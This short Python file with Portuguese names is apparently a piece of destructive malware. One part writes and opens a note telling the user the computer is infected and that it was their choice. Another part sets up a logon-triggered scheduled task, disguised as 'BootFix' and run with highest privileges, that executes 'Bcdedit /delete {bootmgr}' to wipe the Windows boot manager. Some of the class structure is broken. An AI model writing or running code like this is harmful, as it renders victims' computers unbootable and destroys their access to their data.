import os

class Texto:

    def criar_e_executar_texto():
        user = os.getlogin()
        caminho = os.path.join('C:\\', 'Users', user + ".EDU_FIESC", 'Downloads', 'Boot', 'Programa', 'texto.txt')

        text = r'''
            Seu computador esta infectado.
            Lembre-se, foi a sua escolha.
        '''

        with open(caminho, 'w') as file:
            file.write(text)

        os.system(f'start ' + caminho)

class Tarefa:

    def criar_tarefa_agendada():
        def __init__(self):
            self.nome = 'BootFix'
            self.comando = r'Bcdedit /delete {bootmgr}'
            self.programa = f'cmd.exe /c {self.comando}'

        def criar_tarefa(self):
            os.system(f'schtasks /create /tn "{self.nome}" /tr "{self.programa}" /sc onlogon /rl highest /f')

        # Agora deve estar funcionando corretamente, sem os parâmetros